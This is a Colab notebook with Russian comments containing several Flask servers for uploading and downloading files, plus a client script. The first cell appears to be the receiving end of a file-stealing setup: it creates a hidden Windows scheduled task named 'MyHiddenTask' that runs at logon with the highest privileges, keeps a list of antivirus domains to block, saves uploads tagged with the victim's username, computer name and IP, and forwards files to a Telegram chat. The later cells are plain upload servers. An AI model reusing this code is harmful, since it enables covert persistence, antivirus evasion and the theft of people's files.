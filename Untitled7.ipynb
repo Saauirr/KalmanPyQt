{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPvIGqv42RXbE5otQgZcHRC",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Saauirr/KalmanPyQt/blob/master/Untitled7.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "hGFUbH24EUMO",
        "outputId": "50e45fc8-81e7-49cb-ee41-406398880e25",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting python-dotenv\n",
            "  Downloading python_dotenv-1.0.1-py3-none-any.whl (19 kB)\n",
            "Installing collected packages: python-dotenv\n",
            "Successfully installed python-dotenv-1.0.1\n",
            "Requirement already satisfied: python-dotenv in /usr/local/lib/python3.10/dist-packages (1.0.1)\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "WARNING:root:Warning: Your operating system (Linux 6.1.85+) may not be fully supported.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " * Serving Flask app '__main__'\n",
            " * Debug mode: off\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "INFO:werkzeug:\u001b[31m\u001b[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\u001b[0m\n",
            " * Running on all addresses (0.0.0.0)\n",
            " * Running on http://127.0.0.1:5000\n",
            " * Running on http://172.28.0.12:5000\n",
            "INFO:werkzeug:\u001b[33mPress CTRL+C to quit\u001b[0m\n"
          ]
        }
      ],
      "source": [
        "!pip install python-dotenv\n",
        "!pip install python-dotenv\n",
        "\n",
        "import os\n",
        "from datetime import datetime, timedelta\n",
        "import logging\n",
        "import subprocess\n",
        "import sys\n",
        "import socket\n",
        "from flask import Flask, request, send_from_directory\n",
        "import platform\n",
        "from dotenv import load_dotenv\n",
        "\n",
        "# Импорт библиотеки для работы с Telegram\n",
        "try:\n",
        "    from telebot import TeleBot\n",
        "except ImportError:\n",
        "    print(\"Необходимо установить библиотеку pyTelegramBotAPI. Установите её с помощью команды: pip install pyTelegramBotAPI\")\n",
        "    sys.exit(1)\n",
        "\n",
        "# Загрузка переменных среды\n",
        "load_dotenv()\n",
        "TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')\n",
        "CHAT_ID = os.getenv('CHAT_ID')\n",
        "\n",
        "# Настройка Flask и Telegram bot\n",
        "app = Flask(__name__)\n",
        "bot = TeleBot(TELEGRAM_TOKEN)\n",
        "\n",
        "# Настройка логирования\n",
        "logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n",
        "\n",
        "# Список доменов антивирусных компаний\n",
        "ANTIVIRUS_DOMAINS = [\"antivirus-example.com\", \"security-example.com\"]\n",
        "\n",
        "def check_os_compatibility():\n",
        "    supported_versions = ['7', '8', '10', '11']\n",
        "    if platform.system() == \"Windows\" and platform.release() in supported_versions:\n",
        "        logging.info(f\"Operating system Windows {platform.release()} is supported.\")\n",
        "    else:\n",
        "        logging.warning(f\"Warning: Your operating system ({platform.system()} {platform.release()}) may not be fully supported.\")\n",
        "\n",
        "def setup_hidden_task(script_path):\n",
        "    if sys.platform.startswith('win'):\n",
        "        command = f'schtasks /create /tn \"MyHiddenTask\" /tr \"{script_path}\" /sc onlogon /rl highest /f'\n",
        "        try:\n",
        "            subprocess.run(command, check=True, shell=True)\n",
        "            logging.info(\"Scheduled task created successfully for hidden execution.\")\n",
        "        except subprocess.CalledProcessError as e:\n",
        "            logging.error(f\"Failed to create scheduled task: {e}\")\n",
        "\n",
        "def is_ip_blocked(ip_address):\n",
        "    for domain in ANTIVIRUS_DOMAINS:\n",
        "        try:\n",
        "            resolved_ip = socket.gethostbyname(domain)\n",
        "            if ip_address == resolved_ip:\n",
        "                return True\n",
        "        except socket.error as e:\n",
        "            logging.error(f\"DNS resolution failed for {domain}: {e}\")\n",
        "    return False\n",
        "\n",
        "@app.route('/upload', methods=['POST'])\n",
        "def upload_file():\n",
        "    file = request.files['file']\n",
        "    client_ip = request.remote_addr\n",
        "    username = request.form.get('username', 'Unknown')\n",
        "    computer_name = request.form.get('computer_name', 'Unknown')\n",
        "    file.save(os.path.join('uploads', f\"{username}_{computer_name}_{client_ip}_{file.filename}\"))\n",
        "    return \"File uploaded successfully\", 200\n",
        "\n",
        "@app.route('/download/<filename>', methods=['GET'])\n",
        "def download_file(filename):\n",
        "    return send_from_directory(directory='archives', filename=filename)\n",
        "\n",
        "def send_file_telegram(file_path):\n",
        "    with open(file_path, 'rb') as document:\n",
        "        bot.send_document(CHAT_ID, document)\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    check_os_compatibility()\n",
        "    app.run(host='0.0.0.0', port=5000)\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from flask import Flask, request, send_from_directory, jsonify\n",
        "import logging\n",
        "from logging import StreamHandler\n",
        "import sys\n",
        "\n",
        "app = Flask(__name__)\n",
        "\n",
        "# Настройка логирования\n",
        "handler = StreamHandler(sys.stdout)\n",
        "handler.setLevel(logging.INFO)\n",
        "app.logger.addHandler(handler)\n",
        "app.logger.setLevel(logging.INFO)\n",
        "\n",
        "@app.route('/upload', methods=['POST'])\n",
        "def upload_file():\n",
        "    file = request.files['file']\n",
        "    if file:\n",
        "        save_path = os.path.join('uploads', file.filename)\n",
        "        file.save(save_path)\n",
        "        app.logger.info(f\"File {file.filename} uploaded successfully by {request.remote_addr}\")\n",
        "        app.logger.info(f\"File upload task completed: {file.filename}\")\n",
        "        return jsonify(message=\"File uploaded successfully\", status=\"success\", filename=file.filename), 200\n",
        "    else:\n",
        "        app.logger.warning(\"No file received for upload\")\n",
        "        app.logger.info(\"Failed file upload task: No file received\")\n",
        "        return jsonify(message=\"No file received\", status=\"error\"), 400\n",
        "\n",
        "@app.route('/download/<filename>', methods=['GET'])\n",
        "def download_file(filename):\n",
        "    file_path = os.path.join('downloads', filename)\n",
        "    if os.path.exists(file_path):\n",
        "        response = send_from_directory(directory='downloads', filename=filename)\n",
        "        app.logger.info(f\"File {filename} downloaded by {request.remote_addr}\")\n",
        "        app.logger.info(f\"File download task completed: {filename}\")\n",
        "        return response\n",
        "    else:\n",
        "        app.logger.error(f\"File {filename} requested but not found\")\n",
        "        app.logger.info(f\"Failed file download task: {filename} not found\")\n",
        "        return jsonify(message=\"File not found\", status=\"error\"), 404\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    app.logger.info(\"Server is starting...\")\n",
        "    app.run(host='0.0.0.0', port=5000)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pjpnTzgUBhZd",
        "outputId": "3b598113-192c-4b38-9ea1-9f2b1374f375"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Server is starting...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "INFO:__main__:Server is starting...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " * Serving Flask app '__main__'\n",
            " * Debug mode: off\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "INFO:werkzeug:\u001b[31m\u001b[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\u001b[0m\n",
            " * Running on all addresses (0.0.0.0)\n",
            " * Running on http://127.0.0.1:5000\n",
            " * Running on http://172.28.0.12:5000\n",
            "INFO:werkzeug:\u001b[33mPress CTRL+C to quit\u001b[0m\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from flask import Flask, request, jsonify\n",
        "\n",
        "app = Flask(__name__)\n",
        "\n",
        "@app.route('/upload', methods=['POST'])\n",
        "def upload_file():\n",
        "    # Получение файла от клиента\n",
        "    file = request.files['file']\n",
        "    if file:\n",
        "        file.save(os.path.join('uploads', file.filename))  # Сохранение файла\n",
        "        return jsonify(message=\"File uploaded successfully\"), 200\n",
        "    return jsonify(message=\"No file received\"), 400\n",
        "\n",
        "@app.route('/data', methods=['GET', 'POST'])\n",
        "def data():\n",
        "    if request.method == 'POST':\n",
        "        content = request.json\n",
        "        return jsonify({\"Received\": content}), 200\n",
        "    elif request.method == 'GET':\n",
        "        return jsonify({\"data\": \"Here is some data\"}), 200\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    app.run(host='0.0.0.0', port=5000, debug=True)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "i7GkXa8SGyZ4",
        "outputId": "51ecb11b-93a7-4bac-ea85-7f40708a1826"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " * Serving Flask app '__main__'\n",
            " * Debug mode: on\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "INFO:werkzeug:\u001b[31m\u001b[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\u001b[0m\n",
            " * Running on all addresses (0.0.0.0)\n",
            " * Running on http://127.0.0.1:5000\n",
            " * Running on http://172.28.0.12:5000\n",
            "INFO:werkzeug:\u001b[33mPress CTRL+C to quit\u001b[0m\n",
            "INFO:werkzeug: * Restarting with stat\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "\n",
        "def upload_file(url, file_path):\n",
        "    with open(file_path, 'rb') as f:\n",
        "        files = {'file': f}\n",
        "        response = requests.post(url, files=files)\n",
        "        print(response.json())\n",
        "\n",
        "def send_data(url, data):\n",
        "    response = requests.post(url, json=data)\n",
        "    print(response.json())\n",
        "\n",
        "def get_data(url):\n",
        "    response = requests.get(url)\n",
        "    print(response.json())\n",
        "\n",
        "server_url = 'http://localhost:5000'\n",
        "\n",
        "# Пример загрузки файла\n",
        "upload_file(f'{server_url}/upload', 'path_to_your_file.txt')\n",
        "\n",
        "# Пример отправки данных\n",
        "send_data(f'{server_url}/data', {'key': 'value'})\n",
        "\n",
        "# Пример получения данных\n",
        "get_data(f'{server_url}/data')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 332
        },
        "id": "xPVdvcmEHhVy",
        "outputId": "fbe3ff1e-64f7-4072-e803-f3d0e5b085c8"
      },
      "execution_count": 10,
      "outputs": [
        {
          "output_type": "error",
          "ename": "FileNotFoundError",
          "evalue": "[Errno 2] No such file or directory: 'path_to_your_file.txt'",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mFileNotFoundError\u001b[0m                         Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-10-a28499fc3da5>\u001b[0m in \u001b[0;36m<cell line: 20>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     18\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     19\u001b[0m \u001b[0;31m# Пример загрузки файла\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 20\u001b[0;31m \u001b[0mupload_file\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf'{server_url}/upload'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'path_to_your_file.txt'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     21\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     22\u001b[0m \u001b[0;31m# Пример отправки данных\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m<ipython-input-10-a28499fc3da5>\u001b[0m in \u001b[0;36mupload_file\u001b[0;34m(url, file_path)\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;32mdef\u001b[0m \u001b[0mupload_file\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0murl\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfile_path\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m     \u001b[0;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mfile_path\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'rb'\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m         \u001b[0mfiles\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m{\u001b[0m\u001b[0;34m'file'\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m         \u001b[0mresponse\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mrequests\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpost\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0murl\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfiles\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mfiles\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mFileNotFoundError\u001b[0m: [Errno 2] No such file or directory: 'path_to_your_file.txt'"
          ]
        }
      ]
    }
  ]
}